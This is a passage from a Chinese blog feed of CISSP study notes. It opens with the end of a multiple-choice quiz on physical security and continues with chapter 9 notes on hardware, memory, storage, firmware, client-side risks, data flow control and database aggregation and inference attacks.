CCTV(闭路电视)<br>D. 照明</p></li><li><p>以下哪一项不是使用保安人员的缺点?<br>A. 保安人员通常不了解设施内操作的范围<br>B 并非所有环境和设施都支持保安人员<br>C. 并非所有安全人员自身就是可靠的<br>D. 预先筛选、联系和培训并不能保证安全人员的有效和可靠</p></li><li><p>基于水的灭火系统中最常见的故障原因是什么?<br>A. 缺水<br>B. 人<br>C. 离子检测器<br>D. 在吊顶上探测仪的布放</p></li><li><p>物理访问控制设备最普通和便直的是什么?<br>A. 照明<br>B. 保安人员<br>C. 钥匙锁<br>D. 栅栏</p></li><li><p>什么类型的运动检测仪能感应到被监控对象周围电场或磁场的变化?<br>A. 波形检测仪<br>B. 光电检测仪<br>C. 热能检测仪<br>D. 电容检测仪</p></li><li><p>以下哪一项不是触发物理安全报警的典型类型?<br>A. 预防<br>B. 威慑<br>C. 排斥<br>D. 通知</p></li><li><p>无论使用何种形式的物理访问控制，保安人员或其他监控系统都必须被部署来阻止以下问题，但除了哪一个?<br>A. 尾随<br>B. 间谍<br>C. 伪装<br>D. 滥用</p></li><li><p>所有安全解决方案中最重要的目标是什么?<br>A. 暴露阻止<br>B. 维护完整性<br>C. 人身安全<br>D. 维持可用性</p></li><li><p>计算机机房理想的湿度范围是什么?<br>A. 20%至40%<br>B. 40%至60%<br>C. 60%至75%<br>D. 80%至95%</p></li><li><p>什么电压等级的静电会引起存储在硬盘中的数据的破坏?<br>A. 4000 伏特<br>B. 17000 伏特<br>C. 40 伏特<br>D. 1500 伏特</p></li><li><p>B类灭火器不会使用下列哪个灭火材料?<br>A. 水<br>B. 二氧化碳<br>C. 晗龙或可接受的哈龙替代品<br>D. 苏打酸</p></li><li><p>对于计算机设施，基于水的灭火系统最好的类型是什么?<br>A. 湿管系统<br>B. 干管系统<br>C. 预先响应系统<br>D. 洪水系统</p></li><li><p>在发生火灾和除非灭火的情况下，下列哪一项不是造成计算机设备损坏的罪魁祸首?<br>A. 热<br>B. 灭火介质<br>C. 烟<br>D. 照明</p></li></ol>]]></content>
    
    <summary type="html">
    
      本文为cissp中物理安全需求章节的学习笔记
    
    </summary>
    
      <category term="notes" scheme="https://www.diyz.bid/categories/notes/"/>
    
    
      <category term="cissp" scheme="https://www.diyz.bid/tags/cissp/"/>
    
      <category term="学习笔记" scheme="https://www.diyz.bid/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>cissp学习笔记（9）——安全脆弱性、威胁和对策</title>
    <link href="https://www.diyz.bid/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%889%EF%BC%89%E2%80%94%E2%80%94%E5%AE%89%E5%85%A8%E8%84%86%E5%BC%B1%E6%80%A7%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E5%AF%B9%E7%AD%96/"/>
    <id>https://www.diyz.bid/notes/cissp学习笔记（9）——安全脆弱性、威胁和对策/</id>
    <published>2018-09-21T08:05:50.000Z</published>
    <updated>2018-10-11T10:12:52.899Z</updated>
    
    <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>3) 安全工程(安全的工程学和管理)</p><ul><li>E. 评估和缓解安全架构、设计和解决方案元素的脆弱性<ul><li>E.1 基于客户端(例如，applet、本地缓存)</li><li>E.2 基于服务器(例如，数据流控制)</li><li>E.3 数据库安全(例如，推理、汇聚、数据挖掘、数据分析、数据仓库)</li><li>E.4 大规模并行数据系统</li><li>E.5 分布式系统(例如，云计算、网格计算、点对点)</li><li>E.6 密码系统</li><li>E.7 工业控制系统(例如，SCADA)</li></ul></li><li>F. 评估和缓解基于Web的系统(例如，XML、OWASP)的脆弱性</li><li>G. 评估和缓解移动系统的脆弱性</li><li>H. 评估和缓解嵌入式设备和物联网系统(例如，网络使能设备、物联网(loT))的脆弱性</li></ul><h3 id="9-1-评估和缓解安全脆弱性"><a href="#9-1-评估和缓解安全脆弱性" class="headerlink" title="9.1 评估和缓解安全脆弱性"></a>9.1 评估和缓解安全脆弱性</h3><h4 id="9-1-1-硬件"><a href="#9-1-1-硬件" class="headerlink" title="9.1.1 硬件"></a>9.1.1 硬件</h4><p>　　术语”硬件”包含计算机可以实际触摸到的任何有形部分，范围从键盘、显示器到CPU、存储介质和内存条。</p><h5 id="1-处理器"><a href="#1-处理器" class="headerlink" title="1. 处理器"></a>1. 处理器</h5><p>　　通常被称为处理器的CPU是计算机的神经中枢，是一个芯片或多个芯片(在多处理器系统中)，负责管理所有重要的计算操作，并且直接执行或协调复杂的计算工作，从而使计算机完成预定的任务。虽然允许计算机执行复杂的任务，但CPU 实际上都只能执行有限的计算和逻辑操作集，这允许CPU以极快的速度执行计算和逻辑操作。</p><h5 id="2-执行类型"><a href="#2-执行类型" class="headerlink" title="2. 执行类型"></a>2. 执行类型</h5><ul><li><strong>多任务处理</strong> 多任务处理指的是同时处理两个或更多个任务，在任意给定时间都能够应付多个任务或进程。事实上，大多数系统并不是真正的多任务处理系统，它们依靠操作系统，通过仔细构造发送给CPU 执行的命令的顺序来模拟多任务处理。</li><li><strong>多处理</strong> 在多处理环境中，多处理器计算系统(也就是具有多个CPU的系统)利用多个处理器的能力完成一个应用程序的处理任务。在具有多个CPU的现代系统中，具有两种常见的多处理系统类型。单个计算机包含多个由一个操作系统控制的处理器，这被称为对称多处理(Symmetric Mu1tiProcessing，SMP)。在SMP中，处理器不但共享通用操作系统，而且共享通用数据总线和内存资源。另一种被称为大规模并行处理(Massively Parallel Processing，MPP)系统中驻留了数百个甚至上千个处理器，每个处理器都具有自己的操作系统和内存/总线资源。当协调整个系统的活动并调度处理的软件遇到某个计算密集任务时，会分配某个处理器负责完成任务。这个处理器随后将任务分解为若干易于处理的部分，并把这些部分分配给其他处理器执行。那些处理器将它们的计算结果返回至协调处理器，所有计算结果在协调处理器中被重新组合并返回给提出请求的应用程序。MPP系统的能力非常强大(不用说，成本也十分高昂)，并且是很多计算研究中使用的主要系统。</li><li><strong>多程序设计</strong> 为了达到提高计算效率的目的，多程序设计通过操作系统对单个处理器上的两个任务进行协调，从而模拟两个任务同时执行的情况。这种方法在完成某个任务时会导致显著的延迟。不过，对于同一批中的所有进程而言，完成所有任务所需的总时间会减少。多程序设计和多任务处理技术之间存在下列两个主要差异：<ul><li>多程序设计通常在大规模系统(例如，大型机)中使用，而多任务处理在个人计算机操作系统(例如，Windows和Linux)中使用。</li><li>多任务处理通常由操作系统协调使用，而多程序设计则要求特别编写的软件，这种软件通过操作系统来协调自己的活动和执行。</li></ul></li><li><strong>多线程处理</strong> 多线程处理允许在单个进程中执行多个并发任务。线程是一个自包含的指令序列，可以与作为同一父进程一部分的其他线程井行执行。</li></ul><h5 id="3-处理类型"><a href="#3-处理类型" class="headerlink" title="3. 处理类型"></a>3. 处理类型</h5><ul><li><strong>单一状态</strong> 单一状态系统要求使用策略机制来管理不同安全级别的信息。在这种类型的方案中，安全管理员准许处理器和系统每次只处理一个安全级别的问题。</li><li><strong>多态</strong> 多态系统能够实现更高的安全级别。这些系统是被认证过的，通过使用特定的安全机制同时处理多个安全级别。这些安全机制被设计用于阻止信息跨越不同的安全级别。</li></ul><h5 id="4-保护机制"><a href="#4-保护机制" class="headerlink" title="4. 保护机制"></a>4. 保护机制</h5><img src="/notes/cissp学习笔记（9）——安全脆弱性、威胁和对策/保护环.png"><ul><li><strong>保护环</strong> 从安全性的观点出发，保护环将操作系统中的代码和组件(以及应用程序、实用程序或由操作系统控制运行的其他代码)组织在如图所示的同心环内。越进入圆环的内部，与占据特定环的代码相关联的特权级别就越高。环模型的本质在于优先权、特权和内存分割。希望执行的任何进程必须排队等待(进程暂挂队列)。与最小环号相关联的进程总是比与较大环号相关联的进程先运行。在较低编号的环中的进程能够比较高编号的环中的进程访问更多的资源，并且能够更直接地与操作系统交互。在较高编号的环上运行的进程通常必须请求较低编号的环中的处理程序或驱动程序来获得需要的服务，有时这被称为居间访问模型。从安全性的观点出发，环模型使得操作系统能够将自身与用户和应用程序隔离开并加以保护，还允许在高特权操作系统组件(例如，内核)和低特权操作系统部分(例如，操作系统的其他部分以及驱动程序和实用程序)之间实施严格的界线。</li><li><strong>进程状态</strong> 进程状态也被称为操作状态，指的是进程可能在其中运行的各种执行形式。根据进程是否运行，进程可以运作在下列几种状态之一：<ul><li><strong>就绪状态</strong> 在就绪状态中，进程准备在被调度执行时立刻继续或开始处理。在进程到达这个状态时，如果CPU可用，那么进程就会直接转移到运行模式： 如果CPU 不可用，那么进程就停留在就绪状态直至CPU 可用。</li><li><strong>等待状态</strong> 等待状态还可以被理解为” 等待某种资源”，也就是说，进程准备继续执行，但是在能够继续处理之前需要等待某台设备或访问请求(某种中断)提供服务。一些引用将此状态标记为阻塞状态，因为该状态可以阻止进一步的执行，直到某个外部事件发生为止。</li><li><strong>运行状态</strong> 运行中的进程在CPU中执行直至完成、时间片到期或由于某些原因而阻塞(通常是由于生成访问设备或网络的中断并且等待中断完成)。如果进程在时间片结束时尚未完成，那么进程就会返回就绪状态并在队列中排队; 如果在等待资源变得可用时阻塞进程，进程便进入等待状态并排队。</li><li><strong>监管状态</strong> 在进程必须执行的动作要求大于问题状态特权组的特权时(包括更改系统配置、安装设备驱动程序或更改安全设置)，就需要使用监管状态。基本上，没有在用户模式(环3)或问题状态中出现的功能会在监管模式中实现。</li><li><strong>停止状态</strong> 进程结束或者由于发生错误、所请求资源不可用或无法满足资源请求而必须终止时，就会进入停止状态。</li></ul></li><li><strong>安全模式</strong> 在能够部署安全模式之前，必须存在下列三种特定的元素：1.分层的MAC环境；2.对能够访问计算机控制台的主体的完全物理控制；3.对能够进入计算机控制台所在房间的主体的完全物理控制。美国政府为处理分类信息的系统指派了4种被批准的安全模式：<ul><li><strong>专用模式</strong> 专用模式系统本质上相当于本章前面” 处理类型” 中描述的单一状态系统。对于专用系统的用户来说，存在下列三个要求：1.每个用户都必须具有允许访问系统所处理全部信息的安全许可；2.每个用户都必须被批准访问系统所处理的全部信息；3.每个用户都必须具有有效的、对系统所处理全部信息的”知其所需”权限。</li><li><strong>系统高级模式</strong> 每个用户都必须具有允许访问系统所处理全部信息的有效安全许可。每个用户都必须被批准访问系统所处理的全部信息。每个用户都必须具有有效的、对系统所处理部分信息的”知其所需”权限。专用模式和系统高级模式之间的主要差异是： 在系统高级模式的计算设备上，所有用户不必具有对系统所处理全部信息的”知其所需”权限。</li><li><strong>分隔模式</strong> 每个用户都必须具有允许访问系统所处理全部信息的有效安全许可。每个用户都必须被批准访问系统中所需要访问的任何信息。每个用户都必须具有有效的、对系统中所需要访问的所有信息的” 知其所需” 权限。分隔模式和系统高级模式之间的主要差异是： 分隔模式系统的用户不必被批准访问系统中的全部信息。然而，与系统高级模式系统和专用模式系统一样的是，分隔模式系统的所有用户仍然必须具有适当的安全许可。</li><li><strong>多级模式</strong> 某些用户不具有访问系统所处理全部信息的有效安全许可。因此，访问由主体的许可级别是否优于客体的敏感度级别控制。每个用户都必须被批准访问系统中所需要访问的所有信息。每个用户都必须具有有效的、对系统中所需要访问的所有信息的”知其所需”权限。</li></ul></li></ul><p>　　根据所需的安全许可、” 知其所需” 权限以及处理多许可级别数据σDMCL)的能力，下表概述和比较了这4种安全模式。</p><table><thead><tr><th>模式</th><th>安全许可</th><th>知其所需</th><th>PDMCL</th></tr></thead><tbody><tr><td>专用模式</td><td>相同</td><td>无</td><td>无</td></tr><tr><td>系统高级模式</td><td>相同</td><td>是</td><td>无</td></tr><tr><td>分隔模式</td><td>相同</td><td>是</td><td>是</td></tr><tr><td>多级模式</td><td>不同</td><td>是</td><td>是</td></tr></tbody></table><h5 id="5-操作模式"><a href="#5-操作模式" class="headerlink" title="5. 操作模式"></a>5. 操作模式</h5><ul><li><strong>用户模式</strong> 用户模式是在执行用户应用程序时CPU 使用的基本模式。在这种模式中，CPU只允许执行其整个指令集中的部分指令。这样设计的目的是防止用户因为执行设计得很差的代码或无意识地滥用代码而意外损坏系统，此外还保护系统及其数据免遭怀有恶意用户的攻击，这些恶意用户可能企图通过执行精心设计的指令来避开操作系统设置的安全措施，也可能错误地执行会导致未授权访问、损害系统或有价值信息资产的动作。</li><li><strong>特权模式</strong> CPU也支持特权模式，这种模式被设计用于授予操作系统访问CPU所支持完整指令的特权。</li></ul><h4 id="9-1-2-存储器"><a href="#9-1-2-存储器" class="headerlink" title="9.1.2 存储器"></a>9.1.2 存储器</h4><h5 id="1-只读存储器"><a href="#1-只读存储器" class="headerlink" title="1. 只读存储器"></a>1. 只读存储器</h5><p>　　只读存储器(Read-Only Memory，ROM)就是PC能够读但是不能修改(也就是不允许写)的存储器。标准ROM 芯片的内容在出厂时就被”烧入”，并且终端用户无法改变其中的内容。ROM的主要优点在于不能被修改。用户或系统管理员意外发生的错误无法清除或修改芯片上的内容，这个特性使得ROM特别适于协调计算机最内层的工作。有一种ROM类型可以被系统管理员在一定范围内予以修改，这种ROM被称为可编程只读存储器(Programrnable Read-Only Memory，PROM)，并且具有如下所示的几种子类型：</p><ul><li><strong>可编程只读存储器</strong> 基本的可编程只读存储器(PROM)芯片井入了特殊的功能，允许终端用户稍后在芯片中烧入内容。一旦数据被写入PROM 芯片，那么就不能再被更改。</li><li>**可擦除可编程只读存储器(Erasable PROM，EPROM) 在这些芯片上有一个很小的窗口，当用特殊的紫外线光照射时就可以擦除芯片上的内容。这个过程完成后，终端用户就可以将新的信息烧入EPROM，就像它之前从未编程一样。</li><li><strong>电可擦除可编程只读存储器(Electronically ERPOM，EEPROM)</strong> 电可擦除PROM(EEPROM)是另一种更灵活的、更友好的解决方案，使用送到芯片引脚上的电压强制进行擦除。擦除EEPROM时，不用从计算机上拆除芯片。</li><li><strong>闪存</strong> 闪存是EEPROM的衍生概念。它是一种非易失性存储媒体，可以进行电子擦除和重写。EEPROM 和闪存主要的区别是，EEPROM必须完全擦除后才能重写，而闪存可以以块或页的方式进行擦写。</li></ul><h5 id="2-随机存取存储器"><a href="#2-随机存取存储器" class="headerlink" title="2. 随机存取存储器"></a>2. 随机存取存储器</h5><p>　　随机存取存储器(Random Access Memory，RAM)是可读和可写的存储器，包含计算机在处理过程中使用的信息。只有当电源持续不断供应时，RAM才能保存其内容。下面是RAM的几种类型：</p><ul><li><strong>实际的存储器</strong> 实际的存储器(也被称为主存储器)通常是计算机中可用的最大的RAM存储资源。实际的存储器一般由许多动态的RAM芯片组成，因此，CPU必须定期对它们进行刷新。</li><li><strong>高速缓存RAM</strong> 通过将数据从速度较慢的设备取出并暂时存储在高性能的设备上，以便在希望时可以重复使用，高速缓存能够提高系统的性能。</li></ul><h5 id="3-寄存器"><a href="#3-寄存器" class="headerlink" title="3. 寄存器"></a>3. 寄存器</h5><p>　　CPU还包括一种有限容量的板上存储器，即寄存器。在执行计算或处理指令时，寄存器为CPU的核心部分(也就是算术逻辑单元(Arithmetic-Logical Unit，ALU))提供可直接访问的存储位置。事实上，除了数据作为指令的一部分直接提供外，ALU操纵的任何数据必须被载入寄存器。这种存储器类型的主要优点是ALU本身的一部分，因此计算速度与标准的CPU速度一致。</p><h5 id="4-存储器寻址"><a href="#4-存储器寻址" class="headerlink" title="4. 存储器寻址"></a>4. 存储器寻址</h5><p>　　当利用存储器资源时，处理器必须具有引用存储器中不同位置的方法。解决这个问题的办法被称为寻址，并且在不同的环境中存在多种不同的寻址方案。接下来我们将讨论5种比较常用的寻址方案：</p><ul><li><strong>寄存器寻址</strong> 前面曾经提到过，寄存器直接安装在CPU上的非常小的存储位置。当CPU需要从某个寄存器中获得信息来完成操作时，可以使用寄存器地址(例如，”寄存器1”)去访问寄存器的内容。</li><li><strong>立即寻址</strong> 就其本身而言，立即寻址并不是一种技术上的存储器寻址方案，而是引用某些数据的一种方法，这些数据作为指令的一部分提供给CPU使用。</li><li><strong>直接寻址</strong> 在直接寻址中，要访问的存储器位置的实际地址会被提供给CPU。这个地址必须与正在执行的指令位于相同的存储页面上。因为与重新编写立即寻址的硬编码数据相比，存储位置的内容能够更容易地被改变，所以直接寻址比立即寻址更灵活。</li><li><strong>间接寻址</strong> 间接寻址使用的方案类似于直接寻址。但是，作为指令的一部分提供给CPU的存储器地址并不包含CPU用作操作数的真实数值。实际上，存储器地址中包含另一个存储器地址(也许位于不同的页面上)。CPU通过读取间接地址来了解待操作数据驻留的位置，随后从这个地址取出真实的操作数。</li><li><strong>基址+偏移量寻址</strong> 基址叫扁移量寻址使用存储在某个CPU寄存器中的数值作为开始计算的基址。然后，CPU将指令提供的偏移量与基址相加，并从计算得到的存储位置取出操作数。</li></ul><h5 id="5-辅助存储器"><a href="#5-辅助存储器" class="headerlink" title="5. 辅助存储器"></a>5. 辅助存储器</h5><p>　　“辅助存储器”这个术语通常是指磁’即光学介质或者包含CPU不能立刻获得的数据的其他存储设备。辅助存储器比主存储器的价格便直许多，而且可以被用于存储大量的信息。</p><h5 id="6-存储器的安全问题"><a href="#6-存储器的安全问题" class="headerlink" title="6. 存储器的安全问题"></a>6. 存储器的安全问题</h5><p>　　存储器存储并处理数据，而某些数据可能极其敏感。任何保留敏感数据的存储器设备在由于某种原因被允许离<br>开组织之前，应当清除里面的数据。围绕存储器的最重要的一个安全问题是： 在计算机使用过程中一定要控制哪些人可以对存储在存储器中的数据进行访问。</p><h4 id="9-1-3-存储设备"><a href="#9-1-3-存储设备" class="headerlink" title="9.1.3 存储设备"></a>9.1.3 存储设备</h4><ul><li><p>主存储设备与辅助存储设备<br>主存储器也称为主存储设备，是计算机用于保存运行时CPU容易获得的必要信息的RAM。辅助存储器或辅助存储设备包括人们熟悉的每天都使用的长期存储设备。辅助存储设备由磁性介质和光学介质组成。</p></li><li><p>易失性存储设备与非易失性存储设备<br>存储设备的易失性只是一种用来衡量存储设备在电源被切断时丢失数据的可能性的方法。被设计用于保留数据的设备(如磁性介质)属于非易失性的。</p></li><li><p>随机存取与顺序存取<br>存储设备的存取方式有两种。随机存取存储设备允许操作系统通过使用某种寻址系统从设备内的任何位置立刻读取(有时会写入)数据。几乎所有的主存储设备都是随机存取设备。可以使用一个内存地址直接存取存储在RAM 芯片中任何位置的信息，而不必读取在此位置之前物理存储的数据。另一方面，顺序存储设备并不提供这种灵活性。它们要求在到达指定位置之前读取(或快速经过)该位置之前物理存储的所有数据。显而易见，顺序存取存储设备要比随机存取存储设备的操作速度慢许多。但是，此时再次需要根据成本/效益做出决定。许多顺序存取存储设备能够使用价格相对便直的介质保存大量的数据，这个特性使得磁带机非常适合用于与灾难恢复或业务连续性计划相关联的备份任务。</p></li></ul><h4 id="9-1-4-存储介质的安全性"><a href="#9-1-4-存储介质的安全性" class="headerlink" title="9.1.4 存储介质的安全性"></a>9.1.4 存储介质的安全性</h4><ul><li>即使在数据被删除之后，数据仍然可能保留在辅助存储设备上，这种情况被称为数据剩磁。如果确实希望从辅助存储设备上删除数据，那么就需要使用专门设计的实用程序来破坏设备上相应数据的所有磁道，或者破坏或销毁辅助存储设备，从而使其无法被修复(通常称为净化)。</li><li>固态硬盘对于净化呈现出独特的问题。SSD损耗均衡意味着有经常未被标记为”存活”状态的数据块，当它被关闭复制以降低磨损平整块(lower wear leveled bolcks)时仍保存了数据的副本。这意味着对于固态硬盘的数据安全措施，传统的归零是无效的。</li><li>辅助存储设备还很容易被盗。因此，重要的是要使用全磁盘加密，以减少未经授权的实体获取数据的风险。由于SSD的损耗均衡技术，在SSD存储数据之前对其进行全盘加密是一个良好的安全实践。这将减少任何明文数据驻留在休眠块(dormant blocks)中的机会。</li><li>对存储在辅助存储设备上的数据进行访问，是计算机安全专家所面对的最紧要的问题之一。对于硬盘来说，通过结合操作系统的访问控制往往就可以对数据进行保护。可移动介质的安全则面临着极大的挑战，因此对它们的保护经常需要使用密码技术。</li></ul><h4 id="9-1-5-输入和输出设备"><a href="#9-1-5-输入和输出设备" class="headerlink" title="9.1.5 输入和输出设备"></a>9.1.5 输入和输出设备</h4><ul><li><p>显示器<br>有一种被称为TEMPEST 的技术会危及显示器上所显示数据的安全性。TEMPEST技术可以从一定距离外甚至另一个地点探测到每台显示器所发出的电子辐射(被称为Van Eck辐射)。关于任意显示器最大争议的最大风险仍然是肩窥或相机的长焦镜头。</p></li><li><p>打印机<br>由于组织使用了物理安全控制措施，因此带着打印出来的敏感信息走出办公室要比带着软盘或其他磁性介质离开更容易。此外，如果打印机是共享的，那么用户可能会忘了及时取回他们打印出来的敏感信息，因而容易被人偷窥。许多现代的打印机也在本地存储数据，这些数据往往存储在硬盘驱动器上，有一些还保留着无限期的打印拷贝。</p></li><li><p>键盘/鼠标<br>一种简单的设备可以被放在键盘内部或放在连接电缆旁，从而能够截获所有的击键行为，并且可以使用无线电信号将它们传送到远程接收器。此外，如果键盘和鼠标是无线的(包括蓝牙)，那么它们的无线电信号也能够被截获。</p></li><li><p>调制解调器<br>调制解调器允许用户在网络内创建非受控的访问点。在最坏的情况中，如果配置不正确，那么调制解调器会产生相当严重的安全脆弱性，从而致使外部人员突破保护机制的安全防线井直接访问网络资源。最糟糕的是，调制解调器会生成一条可选的出口通道，内部用户可以使用它将数据泄漏到组织外部。</p></li><li><p>输入/输出结构<br>与通用输入碎市出(I/O)操作相关的某些计算机活动(并非单独的设备)也具有安全含义。需要在一定程度上熟悉手动输入碎命出设备配置，以便将旧式的外围设备(这些设备没有自动配置或支持即插即用设置)集成到现代PC中。</p><ul><li><strong>存储映射I/O</strong> CPU管理的地址空间部分能够通过一系列映射的内存地址或位置提供对某些设备类别的访问。从配置的角度看，确认只有一台设备映射到某个特定的存储地址范围以及这个存储地址范围只用于处理设备1/0 是非常重要的。从安全性的角度看，对映射存储位置的访问应当由操作系统居间调停，并且应当得到正确的授权和访问控制。</li><li><strong>中断(IRQ)</strong> 中断(IRQ)是中断请求的缩写，这种技术通过特殊的中断控制器为特定设备指派特定的信号线。从配置的角度看，找出对过时设备有用的未用IRQ号有时是个不断尝试的过程。从安全性的角度看，只有操作系统能够在足够高的特权级别间接访问IRQ，以便防止篡改或意外的错误配置。</li><li><strong>直接内存访问(Direct Memory Access，DMA)</strong> 直接内存访问(DMA)像具有两条信号线的通道一样工作，其中一条线是DMA请求(DRQ)线，另一条则是DMA确认(DACK)线。不需要CPU帮助就可以直接交换实际存储器中数据的设备使用DMA来管理这样的访问。从配置的角度看，管理DMA地址以保持设备地址的唯一性以及确认这样的地址只用于DMA信号发送，是非常重要的。从安全性的角度看，只有操作系统才能够调停DMA的分配以及访问I/O设备的DMA的使用。</li></ul></li></ul><h4 id="9-1-6-固件"><a href="#9-1-6-固件" class="headerlink" title="9.1.6 固件"></a>9.1.6 固件</h4><ul><li><p>BIOS<br>基本输入输出系统(Basic InputJOutput System，BIOS)包含独立于操作系统的原始指令，这些指令被用于启动计算机和从磁盘加载操作系统。BIOS被包含在一个国件设备中，在启动时能够由计算机立即访问。在大多数计算机中，BIOS被存储在EEPROM芯片上以帮助版本升级。BIOS的升级过程被称为”闪存BIOS”。</p></li><li><p>设备固件<br>为了完成任务，许多硬件设备(如打印机和调制解调器)还需要一些有限的处理能力，以便最小化操作系统自身的负担。在许多情况下，这些”迷你型”操作系统完全被包含在相应设备上的固件芯片内。与计算机的BIOS一样，设备固件往往被存储在EEPROM设备上，从而可以在需要时进行更新。</p></li></ul><h3 id="9-2-基于客户端"><a href="#9-2-基于客户端" class="headerlink" title="9.2 基于客户端"></a>9.2 基于客户端</h3><p>　　基于客户端漏洞会使用户及其数据和系统面临遭受攻击和破坏的风险。客户端攻击是能够损害客户的任何攻击类型。客户端或客户端集中攻击的目标是客户机本身或客户机上的进程。</p><h4 id="9-2-1-applet"><a href="#9-2-1-applet" class="headerlink" title="9.2.1 applet"></a>9.2.1 applet</h4><p>　　代理是用户系统发送的、能够对远程系统上存储的数据进行查询和处理的代码对象。applet执行相反的功能，这些代码对象被从服务器发送至客户端以便执行某些操作。事实上，applet实际上是一些自包含的小型程序，这些程序的执行独立于发送它们的服务器。这为远程服务器和终端用户提供了很多优点：</p><ul><li>处理压力被转移至客户端，Web服务器上的资源得到了释放，从而能够处理更多用户的请求。</li><li>客户端可以使用本地资源处理后得到数据，而不是等待远程服务器的响应。在很多情况下，这可以更快地响应对输入数据的修改。</li><li>在正确编程的applet中，Web服务器并不接收作为输入信息提供给applet的数据，因此可以维护财务数据的安全性和隐私性。</li></ul><p>　　applet准许远程系统向本地系统发送执行代码。安全管理员必须采取措施，确保这些代码是安全的，并且正确地屏蔽恶意活动。此外，如果没有逐行地分析这些代码，那么终端用户就永远不能确定这个applet是否包含特洛伊木马组件。下面将探讨两个常用的applet 类型： Java applet和ActiveX控件。</p><ul><li><strong>Java applet</strong> Java applet是在Internet上传输的简短的Java程序，以便在远程系统上执行各种操作。在Java平台的设计过程中，安全性是首要的考虑因素，并且Sun公司的开发团队创建了”沙箱”的概念，从而对Java代码施加特权限制。沙箱将Java代码对象与操作系统的其他部分隔离开，并且强制实施关于对象可访问资源的严格规则。虽然沙盒通过Java减少了恶意事件的种类，但是还存在其他很多己被广泛利用的漏洞。</li><li><strong>ActiveX控件</strong> 在Java applet和ActiveX控件之间存在两种主要的区别。首先，ActiveX控件使用Microsoft公司专有的技术，因此，只能在运行Microsoft浏览器的系统上执行。其次，ActiveX控件不受Java applet中沙箱的限制，它对Windows操作系统环境具有全部的访问权限，并且可以执行很多特权操作。因此，在决定下载执行哪种ActiveX控件时必须采取特殊的预防措施。很多安全管理员已经采取了稍微有些苛刻的态度，也就是禁止从某些可信站点之外的所有站点下载任何ActiveX内容。</li></ul><h4 id="9-2-2-本地缓存"><a href="#9-2-2-本地缓存" class="headerlink" title="9.2.2 本地缓存"></a>9.2.2 本地缓存</h4><p>　　本地缓存是暂时存储在客户端上的任意内容，用于将来重新使用。一个典型的客户端上有许多本地缓存，包括ARP缓存、DNS缓存以及互联网文件缓存。针对缓存的攻击有以下几种：</p><ul><li>ARP缓存投毒<ul><li>ARP回复伪造</li><li>创建静态ARP实体</li></ul></li><li>DNS缓存投毒<ul><li>主机投毒</li><li>授权DNS服务器攻击</li><li>缓存DNS服务器攻击</li><li>DNS查找地址改变</li><li>DNS查询欺骗</li></ul></li><li>恶意临时互联网文件或互联网文件缓存</li></ul><p>　　为了减轻或者预防这些攻击应保持操作系统和应用程序修补来自各自厂商的补丁。安装主机入侵检测系统和网络入侵检测工具来观察这些类型的滥用。定期审计DNS日志、DHCP系统日志以及本地客户端系统日志、可能的防火墙、交换机和路由器日志以及时发现异常或可疑事件。</p><h3 id="9-3-基于服务端"><a href="#9-3-基于服务端" class="headerlink" title="9.3 基于服务端"></a>9.3 基于服务端</h3><p>　　基于服务器关注的重要领域是数据流控制，其中也可能包括客户端。数据流是进程之间、设备之间、网络之间的数据或是通信信道之间的数据的流动。对数据流加以管理能确保不仅以最小延迟的有效方式传输，还使用散列确保吞吐数据的可靠性和使用加密确保机密’性。数据流控制同样还确保接收系统不被通信流量导致过载，尤其是dropping(泪滴)连接或恶意的甚至是自我造成的拒绝服务。当数据溢出发生时，数据可能丢失、损坏或触发重传。这些结果是不利的，并且通常实施数据流控制来防止这些问题的发生。数据流控制可以通过网络设备，包括路由器和交换机，还有网络应用和服务进行提供。</p><h3 id="9-4-数据库安全"><a href="#9-4-数据库安全" class="headerlink" title="9.4 数据库安全"></a>9.4 数据库安全</h3><h4 id="9-4-1-聚合"><a href="#9-4-1-聚合" class="headerlink" title="9.4.1 聚合"></a>9.4.1 聚合</h4><p>　　SQL提供了很多函数，这些函数能够将一个或多个表中的记录组合在一起，以生成可能有用的信息。这个过程被称为聚合(aggregation)。聚合并非没有安全漏洞。聚合攻击被用来收集大量的低安全级别的或低价值的事物，将它们结合起来创造较高安全级别或有价值的东西。严格控制对聚合函数的访问并且充分估计可能展示给未授权个体的潜在信息，这对数据库安全管理员来说是特别重要的。</p><h4 id="9-4-2-推理"><a href="#9-4-2-推理" class="headerlink" title="9.4.2 推理"></a>9.4.2 推理</h4><p>　　与聚合类似，推理攻击利用几个非敏感信息片的组合，从而获得对应该属于更高级分类的信息的访问能力。然而，推理要利用人的推断能力，而不是现代数据库平台的简单数学计算能力。与聚合类似，对于推理攻击的最好防范是对赋予个人用户的特权保持持续警隅。此外，数据的故意混淆可能被用来防止对敏感信息的推理。</p><h4 id="9-4-3-数据挖掘和数据仓库"><a href="#9-4-3-数据挖掘和数据仓库" class="headerlink" title="9.4.3 数据挖掘和数据仓库"></a>9.4.3 数据挖掘和数据仓库</h4><p>　　数据仓库常常包含生产数据库出于存储限制或数据安全性考虑而通常未予存储的详细历史信息。另一种被称为数据字典的存储类型常常用于存储与数据相关的关键信息，包括用法、类型、源、关系和格式。DBMS软件通过读取数据字典来决定用户访问数据的访问权限。数据挖掘技术准许分析人员对数据仓库进行搜索，从而寻找历史数据中潜在的相关信息。数据挖掘活动产生元数据。元数据是关于数据的数据或关于信息的数据。元数据不完全是数据挖掘操作的结果，其他的功能或服务也可以生成元数据。可以认为元数据是数据挖掘的数据浓缩。它也可以是超集、子集或是大的数据集表示。元数据可以是重要的、有意义的、相关的、异常的或数据集的畸变元素。<br>　　数据仓库和数据挖掘技术对于安全专家来说十分重要，这主要有两个原因。首先，前面曾经提到过，数据仓库包含大量潜在的敏感信息，它们容易受到聚合和推理攻击。安全专家必须确保恰当的访问控制，并且采取其他一些安全手段保护数据。其次，在数据挖掘技术被用来开发基于统计异常的入侵检测系统的基准时，实际上可以作为安全工具使用。</p><h4 id="9-4-4-数据分析"><a href="#9-4-4-数据分析" class="headerlink" title="9.4.4 数据分析"></a>9.4.4 数据分析</h4><p>　　